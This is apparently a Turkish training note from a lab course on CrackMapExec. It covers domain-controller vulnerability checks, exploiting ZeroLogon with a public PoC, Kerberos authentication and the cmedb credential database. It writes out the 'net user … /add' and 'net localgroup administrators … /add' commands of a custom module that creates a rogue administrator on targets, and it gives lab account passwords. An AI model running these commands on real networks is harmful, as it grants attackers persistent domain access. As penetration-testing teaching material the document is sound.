+![Pasted image 20241203144219.png](/img/user/resimler/Pasted%20image%2020241203144219.png)
+
+
+### Vulnerability Scan Modules
+
+CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.
+
+
+### ZeroLogon
+Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in kontrolünü ele geçirmek için savunmasız bir Netlogon oturumu başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.
+
+CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.
+
+
+### ZeroLogon Güvenlik Açığı Kontrolü
+![Pasted image 20241203144642.png](/img/user/resimler/Pasted%20image%2020241203144642.png)
+
+
+### PetitPotam
+Güvenlik araştırmacısı Gilles Lionel kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu hizmetine (örneğin bir Domain Controller) yönelik klasik bir NTLM relay saldırısıdır. Lionel ayrıca GitHub PetitPotam'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir kavram kanıtı kodu da yayınladı.
+
+CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan petitpotam adlı bir modül içerir.
+
+
+### Petitpotam Güvenlik Açığı Kontrolü
+![Pasted image 20241203144823.png](/img/user/resimler/Pasted%20image%2020241203144823.png)
+
+
+### noPAC
+noPAC güvenlik açığının istismarı, normal bir domain kullanıcısının ayrıcalıklarının bir domain yöneticisine yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.
+
+CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.
+
+
+### noPAC vulnerability check
+![Pasted image 20241203144947.png](/img/user/resimler/Pasted%20image%2020241203144947.png)
+![Pasted image 20241203144952.png](/img/user/resimler/Pasted%20image%2020241203144952.png)
+
+
+### DFSCoerce
+Filip Dragovic, DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin kontrolünü ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.
+
+Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü dfscoerce'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için Y3t4n0th3rP4ssw0rd şifresiyle carole.holmes hesabını kullanacağız.
+
+
+### DFSCoerce Vulnerability Check
+![Pasted image 20241203145115.png](/img/user/resimler/Pasted%20image%2020241203145115.png)
+
+
+### ShadowCoerce
+ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. Charlie Bromberg bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.
+
+CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.
+
+
+### ShadowCoerce Vulnerability Check
+![Pasted image 20241203145402.png](/img/user/resimler/Pasted%20image%2020241203145402.png)
+![Pasted image 20241203145408.png](/img/user/resimler/Pasted%20image%2020241203145408.png)
+
+Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( ./CrackMapExec/cme/modules/shadowcoerce.py) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( logging.debug ) ile bazı hata ayıklama günlükleri eklediğini göreceğiz. CrackMapExec'i hata ayıklama modunda çalıştırırsak, bu günlükleri yazdıracaktır.
+
+CrackMapExec'i hata ayıklama modunda çalıştırmak için protokolden önce --verbose seçeneğini kullanabiliriz
+
+
+### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma
+![Pasted image 20241203145516.png](/img/user/resimler/Pasted%20image%2020241203145516.png)
+![Pasted image 20241203145527.png](/img/user/resimler/Pasted%20image%2020241203145527.png)
+![Pasted image 20241203145547.png](/img/user/resimler/Pasted%20image%2020241203145547.png)
+![Pasted image 20241203145555.png](/img/user/resimler/Pasted%20image%2020241203145555.png)
+![Pasted image 20241203145602.png](/img/user/resimler/Pasted%20image%2020241203145602.png)
+
+DEBUG ile başlayan satırlar logging.debug'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.
+
+
+### MS17-010 (EternalBlue)
+MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB hizmetindeki kritik bir kimliği doğrulanmamış uzaktan kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.
+
+CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.
+
+
+### MS17-010 Vulnerability Check
+![Pasted image 20241203145753.png](/img/user/resimler/Pasted%20image%2020241203145753.png)
+
+
+### Güvenlik Açığından Yararlanma
+Birçok güvenlik açığı gördük. Onlardan birini istismar etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:
+
+
+### Exploiting ZeroLogon
+
+![Pasted image 20241203145855.png](/img/user/resimler/Pasted%20image%2020241203145855.png)
+
+![Pasted image 20241203145911.png](/img/user/resimler/Pasted%20image%2020241203145911.png)
+![Pasted image 20241203145928.png](/img/user/resimler/Pasted%20image%2020241203145928.png)
+![Pasted image 20241203145952.png](/img/user/resimler/Pasted%20image%2020241203145952.png)
+
+Diğer güvenlik açıklarından da yararlanmayı deneyebiliriz, ancak yararlanmadan önce hedef makineyi sıfırlamamız gerekir.
+
+Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.
+
+
+### Kendi CME Modülümüzü Oluşturmak
+Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.
+
+
+### CrackMapExec'i Poetry ile derleyin
+Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın
+
+Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).
+
+
+### VSCode'un Kurulması ve Çalıştırılması
+![Pasted image 20241203150414.png](/img/user/resimler/Pasted%20image%2020241203150414.png)
+
+Daha sonra açmak için kod yazabiliriz 
+
+![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)
+
+
+### Yeni Modülümüzü Oluşturun
+Modülümüzü oluşturalım. Yeni bir yönetici hesabı oluşturacak basit bir script oluşturacağız.
+23. ./CrackMapExec/cme/modules klasörü altında createadmin.py adında bir dosya oluşturun.
+24. Aşağıdaki kod örneğini dosyaya kopyalayın:
+
+![Pasted image 20241203150546.png](/img/user/resimler/Pasted%20image%2020241203150546.png)
+![Pasted image 20241203150551.png](/img/user/resimler/Pasted%20image%2020241203150551.png)
+
+25. Şimdi modülümüzü özelleştirelim.
+
+Bazı değişkenleri tanımlamamız gerekiyor:
+* name, modül adını nasıl çağıracağımızı belirtir. Bu durumda, createadmin dosya adını kullanacağız.
+* description modülün amacı için kısa bir açıklamadır. Biz bunu Yeni bir yönetici hesabı oluştur olarak ayarlayacağız.
+* supported_protocols, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece SMB kullanacağız.
+* opsec_safe, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir True veya False değeridir.
+* multiple_hosts, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.
+
+Ayrıca, modül için değişkenleri tanımlamak için kullanılan options() yöntemine de sahip olacağız. Bu durumda, USER ve PASS olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri HackTheBoxCME! . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.
+
+![Pasted image 20241203150803.png](/img/user/resimler/Pasted%20image%2020241203150803.png)
+![Pasted image 20241203150814.png](/img/user/resimler/Pasted%20image%2020241203150814.png)
+
+26. Daha sonra, on_admin_login() metodunu kullanarak yürütme ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak context.log.info ve context.log.highlight metotlarını kullanacağız (farklı renklere sahipler).
+
+Bu yürütme için, yöntemin connection.execute(command, True) komutunu kullanarak bir cmd.exe komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için net user username password /add /Y değeriyle ve kullanıcıyı administrators grubuna eklemek için net localgroup administrators username /add değeriyle command değişkenine kaydedilecektir.
+
+![Pasted image 20241203150911.png](/img/user/resimler/Pasted%20image%2020241203150911.png)
+![Pasted image 20241203150916.png](/img/user/resimler/Pasted%20image%2020241203150916.png)
+
+Son olarak, yeni modülümüz şu şekilde görünmelidir:
+![Pasted image 20241203150932.png](/img/user/resimler/Pasted%20image%2020241203150932.png)
+![Pasted image 20241203151010.png](/img/user/resimler/Pasted%20image%2020241203151010.png)
+![Pasted image 20241203151027.png](/img/user/resimler/Pasted%20image%2020241203151027.png)
+
+
+### Modülümüzü Çalıştırma
+Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.
+
+
+### CME Modülümüzün Çalıştırılması createadmin
+![Pasted image 20241203151110.png](/img/user/resimler/Pasted%20image%2020241203151110.png)
+
+Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.
+
+![Pasted image 20241203151145.png](/img/user/resimler/Pasted%20image%2020241203151145.png)
+![Pasted image 20241203151149.png](/img/user/resimler/Pasted%20image%2020241203151149.png)
+
+İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.
+
+Ayrıca context.log.highlight(p)'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?
+
+Bir şeyleri yapmanın her zaman farklı yolları olacaktır. Bu modülde neleri değiştireceğinizi ve bunu nasıl daha iyi yapacağınızı keşfedin. Bu modülü daha da özelleştirmek, kendi modüllerinizi oluşturmaya başlamak için harika bir yerdir.
+
+
+### Diğer Yazarlardan Öğrenmek
+Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.
+
+Örneğin, procdump.py modülü procdump.exe çalıştırılabilir dosyasını bir Base64 dizesi olarak kaydeder, ardından Base64 dizesini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için tasklist komutunu çalıştırır, bunu bir değişkene kaydeder ve işlem kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.
+
+Başka bir örnek get_description.py . Bu modülü groupmembership modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve memberOf özniteliğini almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir çekme isteği gönderdik. Çekme isteği kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.
+
+Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.
+
+
+### Çekme İsteği Oluşturma
+CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir çekme isteği ekleyerek projeye katkıda bulunabiliriz.
+
+Bir çekme isteği yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.
+
+İlerleyen bölümlerde, CrackMapExec kullanımı için IPv6, Kerberos Kimlik Doğrulama ve CrackMapExec veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.
+
+
+
+### Ek CME İşlevselliği
+CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:
+
+* Audit (Denetim) modu
+* IPv6 desteği
+* Birden fazla cihaza saldırırken tamamlanma yüzdesi
+
+### Audit Mode
+
+5.3.0 sürümünde yeni bir mod eklendi: audit modu. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz emoji ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.
+
+Audit modunu yapılandırmak için, varsayılan olarak ~/.cme/cme.conf adresinde bulunan yapılandırma dosyasını düzenlememiz ve audit_mode parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için # karakterini kullanacağız
+
+
+### Enabling Audit Mode
+
+![Pasted image 20241203151754.png](/img/user/resimler/Pasted%20image%2020241203151754.png)
+
+Şimdi çalıştırabilir ve parolanın çıktıda ######## ile değiştirildiğini görebiliriz.
+
+![Pasted image 20241203151816.png](/img/user/resimler/Pasted%20image%2020241203151816.png)
+
+Gördüğümüz gibi, çalıştırma sonucundaki parola # karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.
+
+### Denetim Modu Dosyadaki Parola ile Etkinleştirildi
+![Pasted image 20241203151858.png](/img/user/resimler/Pasted%20image%2020241203151858.png)
+
+
+### IPv6 Support
+CrackMapExec'in bir diğer özelliği de IPv6 üzerinden iletişimi desteklemesidir. Çoğu kuruluş, kullanmasalar bile IPv6'yı varsayılan olarak etkinleştirmiştir ve IPv6'nın IPv4'e göre günlük düzeyinde daha az izlenmesi veya anlaşılması bile mümkündür. Bu da ağ saldırılarının gerçekleştirilmesi ve tespit edilmemesi için bir fırsat yaratmaktadır.
+
+Popüler modüller bölümünde gördüğümüz gibi CrackMapExec get_netconnections modülü ile bilgisayarların IPv6'sını tespit etmemizi sağlıyor. Bu modülü kullanalım ve ardından komutu IPv6 üzerinden çalıştırmayı deneyelim.
+
+
+### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma
+
+![Pasted image 20241203152004.png](/img/user/resimler/Pasted%20image%2020241203152004.png)
+![Pasted image 20241203152012.png](/img/user/resimler/Pasted%20image%2020241203152012.png)
+
+Şimdi IPv6 üzerinden hedefe erişelim.
+![Pasted image 20241203152032.png](/img/user/resimler/Pasted%20image%2020241203152032.png)
+![Pasted image 20241203152041.png](/img/user/resimler/Pasted%20image%2020241203152041.png)
+![Pasted image 20241203152051.png](/img/user/resimler/Pasted%20image%2020241203152051.png)
+
+
+
+### Tamamlanma Yüzdesi
+
+Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik --shares seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.
+
+
+### Tamamlanma Yüzdesi
+![Pasted image 20241203152158.png](/img/user/resimler/Pasted%20image%2020241203152158.png)
+
+Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.
+
+
+### Kerberos Authentication
+
+Yazma sırasında CrackMapEec, SMB, LDAP ve MSSQL protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:
+
+27. ccache dosyasını belirtmek için KRB5CCNAME env adını kullanma. Password Attacks academy modülündeki Pass the Ticket (PtT) from Linux bölümünde Linux'tan Kerberos kullanımı anlatılmaktadır
+28. CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir biletle KRB5CCNAME ortam değişkenini kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.
+
+Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin FQDN'sini çözümlemesi gerektiğidir. Dahili bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve /etc/hosts dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.
+
+
+### Setting Up the /etc/hosts File
+
+![Pasted image 20241203152738.png](/img/user/resimler/Pasted%20image%2020241203152738.png)
+
+![Pasted image 20241203152745.png](/img/user/resimler/Pasted%20image%2020241203152745.png)
+
+CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.
+
+
+### Username and Password - Kerberos Authentication
+CrackMapExec'i -k veya --kerberos seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.
+
+### Kerberos Authentication
+![Pasted image 20241203152841.png](/img/user/resimler/Pasted%20image%2020241203152841.png)
+![Pasted image 20241203152849.png](/img/user/resimler/Pasted%20image%2020241203152849.png)
+
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+
+Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi Kerbrute'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos ön kimlik doğrulaması (ASREPRoasting) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: account_not_exist , julio , ve robert .
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+![Pasted image 20241203152959.png](/img/user/resimler/Pasted%20image%2020241203152959.png)
+
+Gördüğümüz gibi, Kerbrute CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC ön kimlik doğrulaması isterse, KDC_ERR_PREAUTH_FAILED hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, asreproast saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce AESREPRoast Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.
+
+Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos günlüğü etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.
+
+
+### Using AES-128 or AES-256
+Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'lerini de kullanabiliriz, Impacket'ten Secretsdump gibi araçlar genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullanırsak, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve operasyonel bir avantajı (opsec) temsil edecektir. Secretsdump'ı kullanalım ve ardından kimlik doğrulaması için AES256'yı kullanalım.
+
+
+### AES256 ile Kimlik Doğrulama
+
+![Pasted image 20241203153254.png](/img/user/resimler/Pasted%20image%2020241203153254.png)
+
+![Pasted image 20241203153303.png](/img/user/resimler/Pasted%20image%2020241203153303.png)
+
+
+### CCache file - Kerberos Authentication
+
+Bir kimlik bilgisi önbelleği (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle hizmetlere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.
+
+Çoğu durumda, Linux makineleri Kerberos biletlerini ccache dosyaları olarak depolar, sistemlerin biletleri kullanma şekli, ccache dosyasının yolunu gösteren KRB5CCNAME ortam değişkeni aracılığıyla olur. robert kullanıcısı için bir bilet (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım
+
+Bileti oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME ortam değişkenini getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.
+
+
+### Ticket Granting Tickets
+
+![Pasted image 20241203153521.png](/img/user/resimler/Pasted%20image%2020241203153521.png)
+
+![Pasted image 20241203153540.png](/img/user/resimler/Pasted%20image%2020241203153540.png)
+
+Kerberos kimlik doğrulama yöntemimiz olarak KRB5CCNAME ortam değişkenini kullanmak için --use-kcache seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.
+
+
+### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)
+
+![Pasted image 20241203153620.png](/img/user/resimler/Pasted%20image%2020241203153620.png)
+
+
+### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)
+
+![Pasted image 20241203153647.png](/img/user/resimler/Pasted%20image%2020241203153647.png)
+Kerberos Kimlik Doğrulamasını MSSQL protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.
+
+
+### MSSQL Protokolü ile ccache Dosyasını Kullanma
+
+![Pasted image 20241203153720.png](/img/user/resimler/Pasted%20image%2020241203153720.png)
+
+Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz
+
+
+### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme
+
+![Pasted image 20241203153749.png](/img/user/resimler/Pasted%20image%2020241203153749.png)
+![Pasted image 20241203153756.png](/img/user/resimler/Pasted%20image%2020241203153756.png)
+
+
+CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı cmedb ile etkileşime gireceğiz
+
+
+### CMEDB'de Uzmanlaşmak
+
+CME otomatik olarak tüm kullanılan/dökülen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan SQLite veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları ~/.cme/workspaces içinde saklanır. Varsayılan veritabanları ~/.cme/workspaces/default dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.
+
+
+### Varsayılan Veritabanlarını Listeleme
+
+![Pasted image 20241203153927.png](/img/user/resimler/Pasted%20image%2020241203153927.png)
+
+### Veritabanı ile Etkileşim
+
+CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan cmedb ile birlikte gelir. cmedb komutunu yazmak bizi bir komut kabuğuna götürecektir:
+
+### CMEDB
+![Pasted image 20241203154012.png](/img/user/resimler/Pasted%20image%2020241203154012.png)
+
+
+### Workspaces
+Varsayılan çalışma alanı adı varsayılan olarak adlandırılır (bilgi isteminde gösterildiği gibi). Bir çalışma alanı seçildiğinde, CME'de yaptığımız her şey bu çalışma alanında saklanacaktır. Bir çalışma alanı oluşturmak için, cmedb (varsayılan) > komut isteminin root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.
+
+
+### Creating a Workspace
+
+![Pasted image 20241203154232.png](/img/user/resimler/Pasted%20image%2020241203154232.png)
+
+Çalışma alanlarını listelemek için workspace list , çalışma alanını değiştirmek için ise workspace "workspace" yazabiliriz.
+
+
+### Çalışma Alanlarını Listeleme ve Değiştirme
+
+
+![Pasted image 20241203154332.png](/img/user/resimler/Pasted%20image%2020241203154332.png)
+![Pasted image 20241203154335.png](/img/user/resimler/Pasted%20image%2020241203154335.png)
+
+
+### Bir Protokolün Veritabanına Erişim
+
+cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca SMB ve MSSQL yararlı seçeneklere sahiptir:
+
+![Pasted image 20241203154400.png](/img/user/resimler/Pasted%20image%2020241203154400.png)
+
+Bir protokolün veritabanına erişmek için proto protocol komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için help seçeneğini kullanabiliriz:
+
+
+### SMB Protokol Veritabanına Bağlanma
+![Pasted image 20241203154437.png](/img/user/resimler/Pasted%20image%2020241203154437.png)
+
+
+### Protocol Options
+SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.
+
+### Kimlik Bilgilerini Görüntüleme
+CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, düz metin veya hash olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki creds seçeneğini kullanmamız gerekir.
+
+
+### Displaying SMB Credentials
+
+![Pasted image 20241203154559.png](/img/user/resimler/Pasted%20image%2020241203154559.png)
+
+![Pasted image 20241203154618.png](/img/user/resimler/Pasted%20image%2020241203154618.png)
+
+Gördüğünüz gibi, creds'ten sonra bir kullanıcı adı ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca creds hash seçeneği ile tüm hash'leri veya creds plaintext seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.
+
+
+### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme
+
+![Pasted image 20241203154648.png](/img/user/resimler/Pasted%20image%2020241203154648.png)
+
+![Pasted image 20241203154654.png](/img/user/resimler/Pasted%20image%2020241203154654.png)
+
+Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir
+
+MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir
+
+
+### MSSQL için Kimlik Bilgilerini Görüntüleme
+![Pasted image 20241203154752.png](/img/user/resimler/Pasted%20image%2020241203154752.png)
+
+Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.
+
+
+### Kimlik Bilgilerini Kullanma
+
+CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. Julio'nun kimlik bilgilerini id 4 ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için -id CredID seçeneğini kullanmamız gerekir.
+
+### CrackMapExec ile Etkileşim için CredID Kullanımı
+
+![Pasted image 20241203154910.png](/img/user/resimler/Pasted%20image%2020241203154910.png)
+
+
+### Hosts Information
+
+MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.
+
+
+### Displaying Hosts
